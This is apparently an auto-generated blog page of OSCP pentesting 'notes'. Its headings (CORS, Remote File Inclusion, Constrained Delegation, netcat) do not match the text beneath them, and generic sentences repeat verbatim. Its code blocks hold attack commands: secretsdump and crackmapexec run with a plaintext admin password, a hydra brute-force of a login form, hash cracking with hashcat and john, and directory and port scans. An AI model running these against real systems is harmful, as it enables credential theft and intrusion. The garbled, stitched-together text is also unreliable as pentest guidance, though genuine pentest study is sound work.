---
TitleSEO: "OSCP Exam Preparation Notes | ZureFX"
TitlePost: "OSCP Exam Preparation Notes"
Author: "ZureFX"
Description: "Personal notes on OSCP Exam Preparation Notes. Quick reference for pentesting and CTF challenges."
Keywords: "networking, blue team, oscp"
URL: "https://zurefx.github.io/notes/note-oscp-exam-preparation-notes-256.html"
URL_IMAGES: ""
Date: "2024-08-06"
Tags: "Networking, Blue Team, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-oscp-exam-preparation-notes-256"
Permalink: "/notes/note-oscp-exam-preparation-notes-256.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Nginx

### CORS Misconfiguration

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.226.122
crackmapexec smb 10.10.199.10 -u administrator -p 'P@ssw0rd!' --shares
```

## Remote File Inclusion

### feroxbuster

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.38.117.156
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.108.160.142/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
nmap -sCV -p8443,143,25 10.120.12.198 -oN scan.txt
nmap -sCV -p464,8888,53 10.29.105.61 -oN scan.txt
gobuster dir -u http://10.12.96.7/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.110.222.113 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

## Constrained Delegation

### netcat

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.62.87.66/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.
